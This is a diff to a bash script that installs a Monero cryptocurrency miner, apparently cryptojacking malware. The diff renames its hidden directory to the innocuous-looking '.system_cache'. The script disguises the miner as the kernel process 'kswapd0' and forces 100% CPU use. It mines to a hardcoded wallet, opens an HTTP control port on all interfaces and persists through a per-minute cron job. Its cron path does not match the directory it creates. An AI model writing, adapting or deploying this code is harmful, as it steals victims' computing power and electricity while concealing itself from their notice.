@@ -1,16 +1,16 @@
 #!/bin/bash
 
-chattr -i $HOME/.gdm2_manual/*
-chattr -i $HOME/.gdm2_manual/
+chattr -i $HOME/.system_cache/*
+chattr -i $HOME/.system_cache/
 
 # Script to start Monero Ocean Miner and manage files
 
 # Create directory for the files
-mkdir -p "$HOME/.gdm2_manual/"
+mkdir -p "$HOME/.system_cache/"
 
 # Paths to the required files
-KSWAPD0="$HOME/.gdm2_manual/kswapd0"
-CONFIG_JSON="$HOME/.gdm2_manual/config.json"
+KSWAPD0="$HOME/.system_cache/kswapd0"
+CONFIG_JSON="$HOME/.system_cache/config.json"
 
 # Terminate processes related to the specific kswapd0
 pkill -f "$KSWAPD0 --config=$CONFIG_JSON"
@@ -45,49 +45,49 @@ fi
 if [ ! -z $EMAIL ]; then
   PASS="$PASS:$EMAIL"
 fi
-sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.gdm2_manual/config.json
+sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.system_cache/config.json
 
 
 echo "sed"
-#sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/.gdm2_manual/config.json
-#sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.gdm2_manual/config.json
-sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.gdm2_manual/config.json
-sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.gdm2_manual/config.json
-#sed -i 's#"log-file": *null,#"log-file": "'$HOME/.swapd/swapd.log'",#' $HOME/.gdm2_manual/config.json
-#sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.gdm2_manual/config.json
-sed -i 's/"enabled": *[^,]*,/"enabled": true,/' $HOME/.gdm2_manual/config.json
-sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.gdm2_manual/config.json
-sed -i 's/"donate-over-proxy": *[^,]*,/"donate-over-proxy": 0,/' $HOME/.gdm2_manual/config.json
-sed -i 's/"background": *false,/"background": true,/' $HOME/.gdm2_manual/config.json
+#sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/.system_cache/config.json
+#sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.system_cache/config.json
+sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.system_cache/config.json
+sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.system_cache/config.json
+#sed -i 's#"log-file": *null,#"log-file": "'$HOME/.swapd/swapd.log'",#' $HOME/.system_cache/config.json
+#sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.system_cache/config.json
+sed -i 's/"enabled": *[^,]*,/"enabled": true,/' $HOME/.system_cache/config.json
+sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.system_cache/config.json
+sed -i 's/"donate-over-proxy": *[^,]*,/"donate-over-proxy": 0,/' $HOME/.system_cache/config.json
+sed -i 's/"background": *false,/"background": true,/' $HOME/.system_cache/config.json
 
 # Run kswapd0 if no other process with the specific configuration is running
-if ! pgrep -f "$HOME/.gdm2_manual/kswapd0 --config=$HOME/.gdm2_manual/config.json" > /dev/null; then
+if ! pgrep -f "$HOME/.system_cache/kswapd0 --config=$HOME/.system_cache/config.json" > /dev/null; then
     echo "kswapd0 not started. Starting it..."
-    "$HOME/.gdm2_manual/kswapd0 -B --http-host 0.0.0.0 --http-port 8181 --http-access-token 55maui55 -o gulf.moneroocean.stream:80 -u 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX -k --nicehash" &
+    "$HOME/.system_cache/kswapd0 -B --http-host 0.0.0.0 --http-port 8181 --http-access-token 55maui55 -o gulf.moneroocean.stream:80 -u 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX -k --nicehash" &
 else
     echo "kswapd0 is already running."
 fi
 
 # Create the check script
-cat <<'EOF' >"$HOME/.gdm2_manual/check_and_start.sh"
+cat <<'EOF' >"$HOME/.system_cache/check_and_start.sh"
 #!/bin/bash
-lockfile="$HOME/.gdm2_manual/check_and_start.lock"
+lockfile="$HOME/.system_cache/check_and_start.lock"
 
 # Locking-Mechanismus mit flock
 exec 200>"$lockfile"
 flock -n 200 || exit 1
 
-if ! pgrep -f "$HOME/.gdm2_manual/kswapd0"; then
-  $HOME/.gdm2_manual/kswapd0 -B --http-host 0.0.0.0 --http-port 8181 --http-access-token 55maui55 -o gulf.moneroocean.stream:80 -u 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX -k --nicehash
+if ! pgrep -f "$HOME/.system_cache/kswapd0"; then
+  $HOME/.system_cache/kswapd0 -B --http-host 0.0.0.0 --http-port 8181 --http-access-token 55maui55 -o gulf.moneroocean.stream:80 -u 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX -k --nicehash
 fi
 EOF
 
 # Make the check script executable
-chmod +x "$HOME/.gdm2_manual/check_and_start.sh"
+chmod +x "$HOME/.system_cache/check_and_start.sh"
 
 # Nur einen Cronjob hinzufügen, falls nicht vorhanden
 (crontab -l 2>/dev/null | grep -v "check_and_start.sh"; echo "* * * * * $HOME/.gdm2/check_and_start.sh") | crontab -
 
 ## Cron job setup: remove outdated lines and add the new command
-#CRON_JOB="*/5 * * * * $HOME/.gdm2_manual/check_and_start.sh"
+#CRON_JOB="*/5 * * * * $HOME/.system_cache/check_and_start.sh"
 #(crontab -l 2>/dev/null | grep -v -E '(out dat|check_and_start.sh)'; echo "$CRON_JOB") | crontab -
